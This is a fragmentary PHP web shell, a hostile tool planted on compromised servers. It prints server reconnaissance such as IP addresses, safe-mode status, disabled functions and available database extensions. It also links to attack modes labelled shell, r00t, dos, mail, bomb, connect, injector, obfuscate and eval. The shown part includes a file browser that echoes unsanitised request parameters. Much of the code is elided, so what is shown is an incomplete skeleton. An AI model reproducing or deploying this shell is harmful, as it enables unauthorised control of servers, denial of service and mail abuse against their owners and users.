...
?><?php getSoftwareInfo(); ?><?php getClientIp(); ?><?php getServerIp();?><?php getSafeMode(); ?><?php if($os == 'Windows'){ echo showDrives();} ?><?php echo getcwd();?><?php echo $_SERVER['SERVER_ADMIN'];?><?php echo $phpVersion; ?><?php echo function_exists('curl_version')?("<font color='red'>Enabled</font>"):("Disabled"); ?><?php echo function_exists('ocilogon')?("<font color='red'>Enabled</font>"):("Disabled"); ?><?php  echo function_exists('mysql_connect')?("<font color='red'>Enabled</font>"):("Disabled");?><?php echo function_exists('mssql_connect')?("<font color='red'>Enabled</font>"):("Disabled"); ?><?php echo function_exists('pg_connect')?("<font color='red'>Enabled</font>"):("Disabled"); ?><?php getDisabledFunctions(); ?><?php diskSpace(); ?><?php freeSpace(); ?><?php echo $self;?><?php echo $self.'?upload';?><?php echo $self.'?shell';?><?php echo $self.'?r00t'?><?php echo $self.'?dos';?><?php echo $self.'?fuzz';?><?php echo $self.'?mail'?><?php echo $self.'?bomb'?><?php echo $self.'?connect'?><?php echo $self.'?injector'?><?php echo $self.'?obfuscate'?><?php echo $self.'?eval'?><?php echo $self.'?md5'?><?php echo $self.'?gdork'?><?php if($lock == 'on')
    {
...
else if(isset($_GET['gdork']))
{
    ...
    )
    {
        ...
        ?><?php echo $title.$text.$url.$site ?><?php
    }
    else 
    {
    ?><?php
...
{
    ?><?php echo $self;?><?php echo $_GET['open'];?><?php echo filesize($_GET['open']);?><?php
...
else if(isset($_GET['rename']))
{
    ...
    {
?><?php echo $self;?><?php echo $_GET['rename'];?><?php echo $_GET['rename'];?><?php
    }
}
// No request made
// Display home page
...
else
{
    ...
    ?><?php echo $self;?><?php echo $dir;?><?php
    ...
    if(is_dir($dir))
    {
		...
		if(is_writable($dir.$file))
		{
			$color = 'green';
                ...
                if(is_dir($dir.$file))
                {
                    ?><?php echo $color?><?php echo $self ?><?php echo $dir.$file ?><?php echo $file ?><?php echo HumanReadableFilesize(dirSize($dir.$file));?><?php echo getFilePermissions($dir.$file);?><?php echo $self;?><?php echo $dir.$file;?><?php echo $self;?><?php echo $dir.$file;?><?php echo $self;?><?php echo $dir.$file;?><?php
                }
                //Its a file 
                else
                {
                    ?><?php echo $color?><?php echo $self ?><?php echo $dir.$file ?><?php echo $file ?><?php echo HumanReadableFilesize(filesize($dir.$file));?><?php echo getFilePermissions($dir.$file);?><?php echo $self;?><?php echo $dir.$file;?><?php echo $self;?><?php echo $dir.$file;?><?php echo $self;?><?php echo $dir.$file;?><?php
                }
            }
        }
        closedir($handle);
